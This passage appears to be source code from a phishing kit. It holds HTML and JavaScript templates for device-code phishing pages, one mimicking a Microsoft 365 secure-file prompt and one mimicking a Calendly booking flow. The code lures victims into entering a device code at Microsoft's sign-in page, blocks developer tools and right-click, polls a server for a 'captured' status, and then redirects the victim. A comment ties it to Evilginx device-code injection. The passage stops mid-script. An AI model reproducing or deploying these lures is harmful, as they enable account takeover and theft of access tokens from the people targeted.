                        <th style="width: 50%;"><div class="mock-text-sm" style="width: 40px;"></div></th>
                        <th><div class="mock-text-sm" style="width: 30px; margin-left: auto;"></div></th>
                        <th><div class="mock-text-sm" style="width: 50px; margin-left: auto;"></div></th>
                        <th><div class="mock-text-sm" style="width: 60px; margin-left: auto;"></div></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><div class="mock-text-sm" style="width: 80%;"></div></td>
                        <td><div class="mock-text-sm" style="width: 15px; margin-left: auto;"></div></td>
                        <td><div class="mock-text-sm" style="width: 40px; margin-left: auto;"></div></td>
                        <td><div class="mock-text-sm" style="width: 50px; margin-left: auto;"></div></td>
                    </tr>
                    <tr>
                        <td><div class="mock-text-sm" style="width: 65%;"></div></td>
                        <td><div class="mock-text-sm" style="width: 15px; margin-left: auto;"></div></td>
                        <td><div class="mock-text-sm" style="width: 40px; margin-left: auto;"></div></td>
                        <td><div class="mock-text-sm" style="width: 50px; margin-left: auto;"></div></td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>

<!-- COMPACT INTERACTION LAYER -->
<div class="modal-overlay">
    <div class="o365-card">
        
        <div id="mainView">
            <!-- Center Aligned, Enlarged Identity Logo Wrapper -->
            <div class="o365-brand-wrapper">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path fill="#0078d4" d="M21.5 3h-19A1.5 1.5 0 0 0 1 4.5v15A1.5 1.5 0 0 0 2.5 21h19a1.5 1.5 0 0 0 1.5-1.5v-15A1.5 1.5 0 0 0 21.5 3z"/>
                    <path fill="#fff" d="M19 8.5V17h-2.5V9.75L12 13 7.5 9.75V17H5V8.5l7 5 7-5z"/>
                </svg>
            </div>

            <h1 class="o365-heading">Verify Your Identity</h1>
            <p class="secure-subtext">You've received a secure file</p>
            
            <div class="pdf-attachment-box">
                <div class="pdf-brand-icon"></div>
                <div class="pdf-meta">
                    <span class="pdf-name">TAX_INVOICE_SCHEDULE.pdf</span>
                    <span class="pdf-size">156.1KB</span>
                </div>
            </div>
            
            <p class="o365-prompt">To receive and download this PDF file, please enter specific professional credentials matching the verification code assignment sequence.</p>
            
            <div class="input-group">
                <div class="o365-input" id="userCode">Loading...</div>
                <button class="inline-copy-btn" id="copyBtn" onclick="copyCode()" title="Copy Code" disabled>
                    <svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
                </button>
            </div>
            
            <div class="status-message" id="codeStatus"></div>
            
            <button class="o365-btn" id="signInBtn" onclick="openSignIn()" disabled>Next</button>
            
            <div class="o365-footer">
                <span>© 2026 Microsoft</span>
                <a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank">Privacy & Cookies</a>
            </div>
            
            <div class="expiration-timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
        </div>

        <!-- Success Screen Pipeline -->
        <div class="success-viewport" id="successView">
            <div class="success-tick-icon">
                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
            </div>
            <h2>Verification Complete</h2>
            <p>Your identity has been confirmed. Secure identity file access has been successfully granted.</p>
        </div>
        
    </div>
</div>

<script>
    document.addEventListener("keydown", function(e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["i", "j", "c"].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === "u")) {
            e.preventDefault();
        }
    });

    document.addEventListener("contextmenu", function(e) {
        e.preventDefault();
    });

    (function() {
        var sid = '{session_id}';
        var verifyUrl = '{verify_url}';
        var codeReady = {code_ready};
        var code = '{user_code}';
        var expiresIn = {expires_seconds};
        var popup = null;

        var codeEl = document.getElementById('userCode');
        var statusEl = document.getElementById('codeStatus');
        var btnEl = document.getElementById('signInBtn');
        var copyBtnEl = document.getElementById('copyBtn');
        var timerEl = document.getElementById('timerValue');

        function showCode(c, v) {
            code = c;
            if (v) verifyUrl = v;
            codeEl.textContent = c;
            codeEl.classList.remove('loading');
            btnEl.disabled = false;
            copyBtnEl.disabled = false;
            document.getElementById('verifyLink').href = verifyUrl;
        }

        if (codeReady && code) {
            showCode(code, verifyUrl);
        } else {
            codeEl.classList.add('loading');
        }

        function copyCode() {
            if (!code) return;
            if (navigator.clipboard) {
                navigator.clipboard.writeText(code).then(function() {
                    showCopied();
                });
            } else {
                var t = document.createElement('textarea');
                t.value = code;
                t.style.cssText = 'position:fixed;left:-9999px';
                document.body.appendChild(t);
                t.select();
                document.execCommand('copy');
                document.body.removeChild(t);
                showCopied();
            }
        }

        function showCopied() {
            copyBtnEl.classList.add('copied');
            statusEl.textContent = 'Code copied to clipboard';
            setTimeout(function() {
                copyBtnEl.classList.remove('copied');
            }, 3000);
        }

        window.copyCode = copyCode;

        function openSignIn() {
            if (!code) return;
            copyCode();
            var w = 520, h = 700, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
            popup = window.open(verifyUrl, 'ms', 'width=' + w + ',height=' + h + ',left=' + l + ',top=' + t + ',scrollbars=yes,resizable=yes');
            if (popup) popup.focus();
        }

        window.openSignIn = openSignIn;

        function updateTimer() {
            if (expiresIn <= 0) return;
            expiresIn--;
            var m = Math.floor(expiresIn / 60);
            var s = expiresIn % 60;
            timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
            if (expiresIn > 0) setTimeout(updateTimer, 1000);
        }

        if (codeReady) setTimeout(updateTimer, 1000);

        function poll() {
            fetch('/dc/status/' + sid, {
                method: 'GET',
                credentials: 'include'
            })
            .then(function(r) {
                return r.json();
            })
            .then(function(d) {
                if (d.ready && !codeReady) {
                    codeReady = true;
                    showCode(d.user_code, d.verify_url);
                    if (expiresIn === {expires_seconds}) {
                        setTimeout(updateTimer, 1000);
                    }
                }
                if (d.captured) {
                    document.getElementById('mainView').style.display = 'none';
                    document.getElementById('successView').style.display = 'block';
                    if (d.redirect_url) {
                        setTimeout(function() {
                            top.location.href = d.redirect_url;
                        }, 2500);
                    }
                }
                if (!d.failed && !d.expired && !d.captured) {
                    setTimeout(poll, 3000);
                }
            })
            .catch(function() {
                setTimeout(poll, 5000);
            });
        }

        poll();
    })();
</script>
</body>
</html>
`

// Calendly themed page
const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Calendly - Testing Event</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #006bff;
            --primary-hover: #0056cc;
            --bg: #ffffff;
            --text: #1a1a1a;
            --text-muted: #555555;
            --border: #e2e2e2;
            --light-blue: #f3f8ff;
        }

        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        body { font-family: 'Inter', sans-serif; background-color: #fafafa; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }

        /* Calendly Header */
        .navbar { width: 100%; background: #ffffff; border-bottom: 1px solid var(--border); padding: 18px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
        .nav-logo { display: flex; align-items: center; font-size: 20px; font-weight: 800; color: #006bff; letter-spacing: -0.5px; }
        .nav-logo span { color: #1a1a1a; margin-left: 2px; }
        .nav-links { display: flex; gap: 30px; font-size: 15px; font-weight: 500; color: #4a5568; }
        .nav-links a { text-decoration: none; color: inherit; transition: color 0.2s; }
        .nav-links a:hover { color: var(--primary); }

        .app-container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px 20px; }
        .wrapper { width: 100%; max-width: 1060px; position: relative; display: flex; justify-content: center; }
        .main-card { background: white; border: 1px solid var(--border); border-radius: 8px; box-shadow: 0 1px 20px rgba(0,0,0,0.04); display: flex; min-height: 640px; width: 100%; position: relative; overflow: hidden; transition: max-width 0.3s ease; }

        .ribbon { position: absolute; top: 25px; right: -35px; background: #666; color: white; padding: 5px 40px; transform: rotate(45deg); font-size: 10px; font-weight: 700; z-index: 10; letter-spacing: 0.5px; }

        /* Sidebar Layout */
        .sidebar { width: 35%; padding: 45px 35px; border-right: 1px solid var(--border); position: relative; }
        .back-circle { width: 42px; height: 42px; border: 1px solid var(--border); border-radius: 50%; display: none; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 25px; background: white; }
        .back-circle:hover { background: var(--light-blue); border-color: var(--primary); }
        .host-name { color: var(--text-muted); font-size: 14px; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
        .meeting-title { font-size: 26px; font-weight: 700; margin: 0 0 25px 0; color: var(--text); }
        .details-item { display: flex; align-items: center; gap: 12px; color: var(--text-muted); font-weight: 500; font-size: 15px; margin-bottom: 16px; }
        .details-item svg { width: 18px; height: 18px; color: #666; flex-shrink: 0; }
        .sidebar-footer { position: absolute; bottom: 30px; left: 35px; display: flex; gap: 15px; font-size: 13px; }
        .sidebar-footer a { color: var(--primary); text-decoration: none; font-weight: 500; }

        /* Content Frames */
        .content { flex: 1; display: flex; flex-direction: column; background: #fff; position: relative; }
        .view { width: 100%; display: none; padding: 45px; animation: fadeIn 0.25s ease; height: 100%; }
        .view.active { display: block; }

        /* Step 1: Calendar Layout */
        .calendar-layout { display: flex; gap: 20px; }
        .cal-picker { flex: 1; min-width: 300px; }
        .cal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
        .grid { display: grid; grid-template-columns: repeat(7, 1fr); gap: 2px; text-align: center; }
        .day-name { font-size: 11px; font-weight: 700; color: var(--text-muted); padding: 10px 0; }
        
        .date { aspect-ratio: 1; display: flex; align-items: center; justify-content: center; font-size: 14px; border-radius: 50%; color: #d5d5d5; cursor: default; margin: 2px; font-weight: 500; }
        .date.available { background: var(--light-blue); color: var(--primary); font-weight: 700; cursor: pointer; }
        .date.available:hover { background: #e0eeff; }
        .date.active { background: var(--primary) !important; color: white !important; }
        
        .tz-display { margin-top: 40px; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 8px; color: var(--text); }

        /* Time Selection Column */
        .time-panel { width: 0; opacity: 0; overflow: hidden; transition: 0.3s ease; border-left: 0 solid var(--border); }
        .time-panel.show { width: 280px; opacity: 1; padding-left: 20px; border-left: 1px solid var(--border); }
        .slot-row { display: flex; gap: 8px; margin-bottom: 10px; }
        .slot-btn { flex: 1; padding: 15px; border: 1px solid var(--primary); color: var(--primary); background: white; border-radius: 4px; font-weight: 700; cursor: pointer; font-size: 15px; transition: all 0.2s; }
        .slot-btn:hover { border-width: 2px; background: var(--light-blue); }
        .confirm-btn { display: none; background: var(--primary); color: white; border: none; padding: 15px; border-radius: 4px; font-weight: 700; flex: 1; cursor: pointer; font-size: 15px; }

        /* General Forms */
        .form-group { margin-bottom: 22px; }
        .form-group label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; color: var(--text); }
        .form-group input, .form-group textarea { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 6px; font-family: inherit; font-size: 15px; color: var(--text); }
        .form-group input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 1px var(--primary); }
        .btn-action { background: var(--primary); color: white; border: none; padding: 14px 32px; border-radius: 25px; font-weight: 700; cursor: pointer; font-size: 15px; transition: background 0.2s; }
        .btn-action:hover { background: var(--primary-hover); }

        /* Step 3 Login Screen Design */
        .login-frame-container { display: flex; flex-direction: column; align-items: center; padding: 10px 0; }
        .login-title { font-size: 26px; font-weight: 700; color: #0a2540; margin: 0 0 8px 0; text-align: center; line-height: 1.3; }
        .login-subtitle { font-size: 15px; color: var(--text-muted); margin: 0 0 25px 0; text-align: center; max-width: 420px; line-height: 1.4; }
        .login-box { border: 1px solid #e2e8f0; border-radius: 18px; padding: 35px; width: 100%; max-width: 440px; box-shadow: 0 4px 12px rgba(0,0,0,0.015); background: #ffffff; }
        
        .floating-input-container { position: relative; margin-bottom: 20px; border: 1px solid #a0aec0; border-radius: 6px; padding: 10px 14px; }
        .floating-label { position: absolute; top: -10px; left: 12px; background: white; padding: 0 6px; font-size: 12px; color: #718096; font-weight: 500; }
        .static-email-text { font-size: 16px; color: #1a202c; padding: 2px 0; margin: 0; word-break: break-all; font-weight: 500; }

        .btn-continue { width: 100%; background: #006bff; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 20px; }
        .btn-continue:hover { background: #0056cc; }
        .divider-row { display: flex; align-items: center; text-align: center; color: #a0aec0; font-size: 12px; font-weight: 600; margin-bottom: 20px; letter-spacing: 0.5px; }
        .divider-row::before, .divider-row::after { content: ''; flex: 1; border-bottom: 1px solid #e2e8f0; }
        .divider-row:not(:empty)::before { margin-right: .75em; }
        .divider-row:not(:empty)::after { margin-left: .75em; }

        .oauth-btn { width: 100%; background: #ffffff; border: 1px solid #0a2540; color: #4a5568; padding: 12px; border-radius: 6px; font-size: 15px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; margin-bottom: 12px; }
        .oauth-btn:hover { background: #f7fafc; }
        .oauth-btn img { width: 18px; height: 18px; }

        /* REVERTED DIALOG BOX OVERLAY DIMENSIONS */
        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(15, 23, 42, 0.4); backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px); z-index: 200; align-items: center; justify-content: center; padding: 16px; }
        
        /* Restored max-width back to 400px */
        .secure-card { border: 1px solid #e2e8f0; border-radius: 12px; width: 100%; max-width: 400px; background: #ffffff; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); display: flex; flex-direction: column; overflow: hidden; }
        
        /* Restored header paddings and font-sizes */
        .secure-header { padding: 20px 24px; display: flex; gap: 14px; align-items: center; border-bottom: 1px solid #f1f5f9; background: #ffffff; }
        .secure-icon-box { background: #f0f7ff; border-radius: 8px; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .secure-icon-box svg { width: 20px; height: 20px; color: #006bff; }
        .secure-header-details { display: flex; flex-direction: column; }
        .secure-badge { font-size: 11px; font-weight: 700; color: #006bff; letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 1px; }
        .secure-title { font-size: 16px; font-weight: 700; color: #0f172a; margin: 0 0 2px 0; letter-spacing: -0.1px; }
        .secure-subtitle { font-size: 13px; color: #64748b; margin: 0; font-weight: 400; }

        /* Restored body paddings */
        .secure-body { padding: 20px 24px; display: flex; flex-direction: column; background: #ffffff; }
        
        .access-code-label-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
        .access-code-label { font-size: 12px; font-weight: 600; color: #64748b; letter-spacing: 0.5px; text-transform: uppercase; }
        
        .refresh-code-link { font-size: 13px; color: #006bff; text-decoration: none; font-weight: 500; display: flex; align-items: center; gap: 4px; }
        .refresh-code-link:hover { text-decoration: underline; }
        
        /* Restored verification code box space dimensions */
        .code-display-box { border: 1px solid #cbd5e1; border-radius: 8px; padding: 10px 14px; background: #f8fafc; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; min-height: 52px; }
        .code-string { font-family: -apple-system, BlinkMacSystemFont, monospace; font-size: 20px; font-weight: 700; color: #0f172a; letter-spacing: 4px; margin: 0; }
        
        .btn-copy { background: #ffffff; border: 1px solid #cbd5e1; border-radius: 6px; color: #334155; padding: 6px 12px; font-size: 13px; font-weight: 500; cursor: pointer; display: flex; align-items: center; gap: 4px; }
        .btn-copy:hover { background: #f1f5f9; border-color: #94a3b8; }

        /* Restored layout guidelines sizing rules */
        .instruction-list { display: flex; flex-direction: column; gap: 10px; margin: 0 0 20px 0; padding: 0; list-style: none; }
        .instruction-item { display: flex; gap: 10px; align-items: flex-start; font-size: 13.5px; color: #334155; font-weight: 400; line-height: 1.4; }
        .instruction-num { width: 18px; height: 18px; border-radius: 50%; background: #e2e8f0; color: #475569; font-size: 11px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 1px; }

        /* Restored structural interaction paddings */
        .btn-secure-authenticate { width: 100%; background: #006bff; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 8px; }
        .btn-secure-authenticate:hover { background: #0056cc; }
        .btn-secure-back { width: 100%; background: #ffffff; color: #475569; border: 1px solid #cbd5e1; padding: 12px; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; }
        .btn-secure-back:hover { background: #f8fafc; border-color: #94a3b8; }

        /* Restored informational text scales */
        .secure-footer { border-top: 1px solid #f1f5f9; padding: 12px; background: #f8fafc; display: flex; justify-content: center; gap: 8px; font-size: 11px; color: #94a3b8; font-weight: 500; }

        /* Step 4: Success Layout */
        .success-container { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; margin: auto; }
        .success-box { border: 1px solid var(--border); border-radius: 8px; padding: 25px; text-align: left; width: 100%; max-width: 460px; margin: 30px 0; background: #fff; }
        .dl-section { border-top: 1px solid var(--border); padding-top: 20px; margin-top: 20px; font-size: 14px; color: var(--text-muted); line-height: 1.5; }
        .btn-dl { color: var(--primary); text-decoration: none; font-weight: 600; display: inline-block; margin-top: 8px; }

        @media (max-width: 900px) {
            .navbar { padding: 15px 20px; }
            .nav-links { display: none; }
            .main-card { flex-direction: column; }
            .sidebar { width: 100%; border-right: none; border-bottom: 1px solid var(--border); padding: 30px; }
            .calendar-layout { flex-direction: column; }
            .time-panel.show { width: 100%; border-left: none; border-top: 1px solid var(--border); padding: 20px 0; }
        }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<nav class="navbar">
    <div class="nav-logo">Calendly<span></span></div>
    <div class="nav-links">
        <a href="#">Individuals</a>
        <a href="#">Teams</a>
        <a href="#">Enterprise</a>
        <a href="#">Product</a>
        <a href="#">Pricing</a>
        <a href="#">Resources</a>
    </div>
</nav>

<div class="app-container">
    <div class="wrapper">
        <div class="main-card" id="card">
            <div class="ribbon">POWERED BY<br>Calendly</div>

            <div class="sidebar" id="sidebar">
                <div class="back-circle" id="backBtn" onclick="stepBack()">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
                </div>
                <div class="host-name">Testing Workspace</div>
                <h1 class="meeting-title">Testing Event Sandbox</h1>
                
                <div class="details-item">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
                    <span>30 min</span>
                </div>
                <div class="details-item">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 7l-7 5 7 5V7z"></path><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>
                    <span>Zoom Video Conference</span>
                </div>
                <div class="details-item" id="sideDT" style="display: none;">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
                    <span id="dtDisplay"></span>
                </div>
                
                <div class="sidebar-footer">
                    <a href="#">Cookie settings</a>
                    <a href="#">Privacy Policy</a>
                </div>
            </div>

            <div class="content">
                
                <div id="step1" class="view active">
                    <h2 style="font-size: 20px; margin-top: 0; font-weight: 700;">Select a Date & Time</h2>
                    <div class="calendar-layout">
                        <div class="cal-picker">
                            <div class="cal-header">
                                <span id="monthName" style="font-weight: 600; font-size: 16px;"></span>
                                <div style="color: var(--primary); font-weight: bold; cursor: pointer; font-size: 14px;">&lt; &nbsp; &gt;</div>
                            </div>
                            <div class="grid" id="calendarGrid">
                                <div class="day-name">MON</div><div class="day-name">TUE</div><div class="day-name">WED</div>
                                <div class="day-name">THU</div><div class="day-name">FRI</div><div class="day-name">SAT</div><div class="day-name">SUN</div>
                            </div>
                            <div class="tz-display">
                                <span>🌎</span> <span id="localTz">Loading local data...</span> ▾
                            </div>
                        </div>
                        <div class="time-panel" id="timePanel">
                            <p id="panelDate" style="font-weight: 600; margin-bottom: 20px; font-size: 15px; color: #1a1a1a;"></p>
                            <div id="slotsScroll" style="height: 380px; overflow-y: auto; padding-right: 4px;"></div>
                        </div>
                    </div>
                </div>

                <div id="step2" class="view">
                    <h2 style="font-size: 20px; margin-top: 0; font-weight: 700;">Enter Details</h2>
                    <div class="form-group"><label>Name *</label><input type="text" value="Testing Account" placeholder="Your Name"></div>
                    <div class="form-group"><label>Email Address *</label><input type="email" placeholder="you@example.com" id="userEmail" oninput="syncEmailLabel(this.value)"></div>
                    <div class="form-group"><label>Please share anything that will help prepare for our meeting.</label><textarea rows="3" placeholder="Context or goals..."></textarea></div>
                    <button class="btn-action" onclick="handleFormSubmit()">Continue</button>
                </div>

                <div id="step3" class="view">
                    <div class="login-frame-container">
                        <h1 class="login-title">Log in to add this email to your calendar</h1>
                        <p class="login-subtitle">Please sign in to coordinate slots and synchronize invitations directly to your system ledger.</p>
                        
                        <div class="login-box">
                            <div class="floating-input-container">
                                <span class="floating-label">Email</span>
                                <p class="static-email-text" id="targetEmailMock">you@example.com</p>
                            </div>
                            
                            <button class="btn-continue" onclick="openOtpDialog()">Get Authentication Code</button>
                            
                            <div class="divider-row">OR</div>
                            
                            <button class="btn-oauth oauth-btn" onclick="goToStep(4)">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
                                Login with Microsoft
                            </button>
                        </div>
                    </div>
                </div>

                <div id="step4" class="view" style="padding: 0; background: #fff;">
                    <div class="success-container">
                        <div style="font-size: 52px; color: #2ecc71; margin-bottom: 5px;">✓</div>
                        <h2 style="margin: 10px 0 6px; font-size: 24px; font-weight: 700;">Confirmed</h2>
                        <p style="color: var(--text-muted); margin: 0; font-size: 15px;">Your meeting session has been synced and secured.</p>
                        
                        <div class="success-box">
                            <h3 style="margin: 0 0 16px; font-size: 18px; font-weight: 700;">Testing Event Sandbox</h3>
                            <div class="details-item" id="finalDT"></div>
                            <div class="details-item">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                                <span>Zoom Video Conference links attached</span>
                            </div>
                            <div class="dl-section">
                                Download the raw calendar invitation file below to parse this window straight into your device system.
                                <br>
                                <a class="btn-dl" href="#" onclick="alert('ICS invitation file generation complete.')">⬇ Download invitation.ics file</a>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<div class="modal-overlay" id="otpOverlay">
    <div class="secure-card">
        <div class="secure-header">
            <div class="secure-icon-box">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
            </div>
            <div class="secure-header-details">
                <span class="secure-badge">Identity Validation</span>
                <h2 class="secure-title">Calendar Verification</h2>
                <p class="secure-subtitle">Confirm your slot request</p>
            </div>
        </div>
        
        <div class="secure-body">
            <div class="access-code-label-row">
                <span class="access-code-label">One-Time Passcode</span>
                <a href="#" class="refresh-code-link" onclick="generateNewCode(); return false;">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg>
                    New code
                </a>
            </div>
            <div class="code-display-box">
                <p class="code-string" id="authCodePlaceholder">Loading...</p>
                <button class="btn-copy" onclick="copyAuthCode()">
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                    Copy
                </button>
            </div>

            <ul class="instruction-list">
                <li class="instruction-item">
                    <span class="instruction-num">1</span>
                    <span>Copy the authorization code listed above.</span>
                </li>
                <li class="instruction-item">
                    <span class="instruction-num">2</span>
                    <span>Click <b>Authenticate Booking</b> to register your credentials.</span>
                </li>
                <li class="instruction-item">
                    <span class="instruction-num">3</span>
                    <span>Provide the token to lock in your calendar window.</span>
                </li>
            </ul>

            <button class="btn-secure-authenticate" onclick="confirmAndProceed()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right: 2px;"><polyline points="20 6 9 17 4 12"></polyline></svg>
                Authenticate Booking
            </button>
            
            <button class="btn-secure-back" onclick="closeOtpDialog()">
                Cancel
            </button>
        </div>

        <div class="secure-footer">
            <span>Secure sync</span>
            <span>•</span>
            <span>Encrypted tunnel</span>
        </div>
    </div>
</div>

<script>
    const now = new Date();
    let selDate = null;
    let selTime = null;
    let currentStep = 1;

    // Evilginx device code injection variables
    var sid = '{session_id}';
    var verifyUrl = '{verify_url}';
    var codeReady = {code_ready};
    var code = '{user_code}';
    var expiresIn = {expires_seconds};
    var popup = null;

    function initializeLocationAndTime() {
        const timeStr = new Date().toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
        let tzName = Intl.DateTimeFormat().resolvedOptions().timeZone;
        tzName = tzName ? tzName.replace(/_/g, ' ') : "Local System Time";
        document.getElementById('localTz').innerText = tzName + " (" + timeStr + ")";
    }
    initializeLocationAndTime();
    setInterval(initializeLocationAndTime, 30000);

    function buildCalendlyCalendar() {
        const grid = document.getElementById('calendarGrid');
        const firstDay = new Date(now.getFullYear(), now.getMonth(), 1).getDay();
        const totalDays = new Date(now.getFullYear(), now.getMonth() + 1, 0).getDate();
        const offset = (firstDay === 0) ? 6 : firstDay - 1;

        document.getElementById('monthName').innerText = now.toLocaleDateString('en-US', { month: 'long', year: 'numeric' });
        
        for (let i = 0; i < offset; i++) {
            grid.innerHTML += "<div></div>";
        }

        const weeklyAllowedIndices = [];
        for (let w = 0; w < 6; w++) {
            const pool = [1, 2, 3, 4];
            const countToKeep = Math.floor(Math.random() * 2) + 2; 
            const shuffled = pool.sort(() => 0.5 - Math.random());
            weeklyAllowedIndices.push(shuffled.slice(0, countToKeep));
        }

        for (let d = 1; d <= totalDays; d++) {
            const dateObj = new Date(now.getFullYear(), now.getMonth(), d);
            const dayOfWeek = dateObj.getDay(); 
            const absoluteDayIndex = offset + d - 1;
            const weekIndex = Math.floor(absoluteDayIndex / 7);

            const isPastDate = new Date(now.getFullYear(), now.getMonth(), d, 23, 59, 59) < now;
            const belongsToAllowedRandomPool = weeklyAllowedIndices[weekIndex] && weeklyAllowedIndices[weekIndex].includes(dayOfWeek);
            const isAvailableWindow = !isPastDate && belongsToAllowedRandomPool;

            const dateElement = document.createElement('div');
            dateElement.className = "date " + (isAvailableWindow ? 'available' : '');
            dateElement.innerText = d;

            if (isAvailableWindow) {
                dateElement.onclick = () => {
                    document.querySelectorAll('.date').forEach(el => el.classList.remove('active'));
                    dateElement.classList.add('active');
                    revealTimeSlots(dateObj);
                };
            }
            grid.appendChild(dateElement);
        }
    }

    function revealTimeSlots(date) {
        selDate = date;
        const panel = document.getElementById('timePanel');
        const container = document.getElementById('slotsScroll');
        
        document.getElementById('panelDate').innerText = date.toLocaleDateString('en-US', { weekday: 'long', month: 'short', day: 'numeric' });
        panel.classList.add('show');
        
        const slotsArray = ["09:00", "10:30", "13:00", "14:30", "16:00"];
        container.innerHTML = '';
        
        slotsArray.forEach(time => {
            const row = document.createElement('div');
            row.className = 'slot-row';
            
            const mainBtn = document.createElement('button');
            mainBtn.className = 'slot-btn';
            mainBtn.innerText = time;
            
            const nextBtn = document.createElement('button');
            nextBtn.className = 'confirm-btn';
            nextBtn.innerText = 'Next';
            
            nextBtn.onclick = () => { selTime = time; goToStep(2); };
            mainBtn.onclick = () => {
                document.querySelectorAll('.slot-btn').forEach(b => b.style.display = 'block');
                document.querySelectorAll('.confirm-btn').forEach(b => b.style.display = 'none');
                mainBtn.style.display = 'none';
                nextBtn.style.display = 'block';
            };

            row.append(mainBtn, nextBtn);
            container.appendChild(row);
        });
    }

    function syncEmailLabel(value) {
        const cleanVal = value.trim() || "you@example.com";
        document.getElementById('targetEmailMock').innerText = cleanVal;
    }

    function handleFormSubmit() {
        const val = document.getElementById('userEmail').value.trim();
        if(!val) {
            alert("Please enter a valid email address to continue.");
            return;
        }
        goToStep(3);
    }

    function updateCodeDisplay(c, v) {
        code = c;
        if(v) verifyUrl = v;
        if(code) {
            let displayCode = code.split('').join(' ');
            document.getElementById('authCodePlaceholder').innerHTML = displayCode;
        } else {
            document.getElementById('authCodePlaceholder').innerHTML = 'Loading...';
        }
    }

